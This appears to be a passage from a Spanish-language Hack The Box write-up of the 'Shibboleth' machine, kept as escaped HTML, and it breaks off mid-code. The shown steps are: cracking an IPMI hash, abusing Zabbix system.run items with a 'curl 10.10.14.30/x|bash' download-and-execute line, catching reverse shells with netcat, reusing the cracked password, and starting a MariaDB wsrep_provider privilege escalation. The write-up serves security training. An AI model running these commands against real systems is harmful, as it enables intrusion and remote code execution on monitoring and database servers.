&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; passwords with &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; left &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;176863/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; passwords with &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; left &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;174738/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Administrator:4adb246d82050000260b44a85fb2076bed27820cdd7f85ade6ab78d9a16aee08fa2b3fde6173a135a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:603a52b1de3168450f23cd8e3fab3425f857e49d:ilovepumkinpie1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cracked &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; passwords with &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; left &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172136/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;zabbix---user&#34;&gt;Zabbix - User&lt;/h1&gt;
&lt;p&gt;Las credenciales nos dieron acceso al dashboard de Zabbix, aunque dicho usuario al que accedimos no es un administrador.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_20211127_181145.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tras investigar acerca de ejecucion de comandos en Zabbix encontramos un &lt;a href=&#34;https://blog.zabbix.com/zabbix-remote-commands/7500/&#34;&gt;post - Zabbix&lt;/a&gt; donde muestra como ejecutar comandos de manera remota, vemos que utiliza &lt;code&gt;system.run[&amp;quot;&amp;quot;]&lt;/code&gt; en un &lt;a href=&#34;https://blog.zabbix.com/zabbix-remote-commands/7500/#TestingZabbixremotecommands&#34;&gt;test con items&lt;/a&gt;. Replicando esto mismo en un item agregamos un comando para realizr un ping a nuestra maquina en: &lt;code&gt;Configuration &amp;gt; Hosts &amp;gt; Items &amp;gt; Create Item &amp;gt; Key &amp;gt; system.run[&amp;quot;ping -c 4 10.10.14.30&amp;quot;]&lt;/code&gt;, finalmente &lt;code&gt;Add&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_20211127_182009.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que el item fue creado y guardado.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_20211127_182108.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Accedemos y ejecutamos este en &lt;code&gt;Test&lt;/code&gt; y &lt;code&gt;Get value and test&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_20211127_182155.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En nuestra maquina obtuvimos ping desde Shibboleth.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;v&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;... &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; full protocol decode
listening on tun0, link-type RAW &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Raw IP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, snapshot length &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes
00:22:40.755421 IP shibboleth.htb &amp;gt; 10.10.14.30: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; request, id 4, seq 1, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
00:22:40.755436 IP 10.10.14.30 &amp;gt; shibboleth.htb: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; reply, id 4, seq 1, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
00:22:41.759407 IP shibboleth.htb &amp;gt; 10.10.14.30: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; request, id 4, seq 2, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
00:22:41.759589 IP 10.10.14.30 &amp;gt; shibboleth.htb: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; reply, id 4, seq 2, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
00:22:42.758613 IP shibboleth.htb &amp;gt; 10.10.14.30: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; request, id 4, seq 3, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
00:22:42.758664 IP 10.10.14.30 &amp;gt; shibboleth.htb: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; reply, id 4, seq 3, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Ejecutamos una shell inversa, aunque esta mor√≠a al poco tiempo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from shibboleth.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.11.124&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;45862&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t access tty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; job control turned off
$
 œÄ ~/htb/shibboleth 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;a href=&#34;https://github.com/sckull/shells&#34;&gt;Shells&lt;/a&gt;, para crear el archivo &lt;code&gt;x&lt;/code&gt; con multiples shells. Con ello modificamos el payload del Item en Zabbix para ejecutar una de estas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;system.run&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;curl 10.10.14.30/x|bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Finalmente realizamos un test del Item lo que nos dio acceso a la maquina como &lt;code&gt;zabbix&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1337&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1337&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from shibboleth.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.11.124&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;60260&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t access tty; job control turned off
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;$ which python
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;$ which python3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;/usr/bin/python3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;$ python3 -c &amp;#39;&lt;/span&gt;import pty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;pty.spawn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
zabbix@shibboleth:/$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id
zabbix
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;110&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;zabbix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;118&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;zabbix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;118&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;zabbix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
zabbix@shibboleth:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;ipmi-svc---user&#34;&gt;Ipmi-svc - User&lt;/h1&gt;
&lt;p&gt;Utilizando la contrase√±a que encontramos anteriormente logramos acceder acceso al usuario ipmi-svc y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;zabbix@shibboleth:/$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id
zabbix
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;110&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;zabbix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;118&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;zabbix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;118&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;zabbix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
zabbix@shibboleth:/$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home
zabbix@shibboleth:/$ ls
ipmi-svc
zabbix@shibboleth:/$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ipmi-svc
zabbix@shibboleth:/$ ls -lah
total 32K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ipmi-svc ipmi-svc 4.0K Oct &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 12:23 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root     root     4.0K Oct &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 12:24 ..
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .bash_history -&amp;gt; /dev/null
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc  &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .bash_logout
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc 3.7K Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .bashrc
drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ipmi-svc ipmi-svc 4.0K Apr &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .cache
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .mysql_history -&amp;gt; /dev/null
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc  &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .profile
-rw-r----- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc   &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 00:29 user.txt
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ipmi-svc ipmi-svc   &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; .vimrc
zabbix@shibboleth:/$ cat user.txt
cat: user.txt: Permission denied
zabbix@shibboleth:/$ su ipmi-svc
Password: ilovepumkinpie1
ipmi-svc@shibboleth:~$ cat user.txt
1338086b46c6078da513f7b3637099b8
ipmi-svc@shibboleth:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Vemos multiples puertos abiertos localmente, uno de ellos parece ser el de mysql y este ultimo esta siendo ejecutado por el usuario root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ipmi-svc@shibboleth:~$ netstat -ntpl
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:10050           0.0.0.0:*               LISTEN      -
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:10051           0.0.0.0:*               LISTEN      -
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::10050                :::*                    LISTEN      -
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::10051                :::*                    LISTEN      -
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::80                   :::*                    LISTEN      -
ipmi-svc@shibboleth:~$ ps -ef&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep mysql
root        &lt;span class=&#34;m&#34;&gt;1227&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 00:28 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root        &lt;span class=&#34;m&#34;&gt;1402&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1227&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 00:28 ?        00:00:16 /usr/sbin/mysqld --basedir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr --datadir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/lib/mysql --plugin-dir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;root --skip-log-error --pid-file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/run/mysqld/mysqld.pid --socket&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/run/mysqld/mysqld.sock
root        &lt;span class=&#34;m&#34;&gt;1403&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1227&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 00:28 ?        00:00:00 logger -t mysqld -p daemon error
ipmi-svc   &lt;span class=&#34;m&#34;&gt;26604&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;26363&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:20 pts/2    00:00:00 grep --color&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;auto mysql
ipmi-svc@shibboleth:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Si revisamos la version vemos que es 10.3.25 de MariaDB.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ipmi-svc@shibboleth:~$ mysql --version
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; debian-linux-gnu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; using readline 5.2
ipmi-svc@shibboleth:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que existe una vulnerabilidad que permite la ejecucion de comandos al modificar la variable &lt;a href=&#34;https://galeracluster.com/library/documentation/mysql-wsrep-options.html#wsrep-provider&#34;&gt;&lt;code&gt;wsrep_provider&lt;/code&gt;&lt;/a&gt; y afecta a la version de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
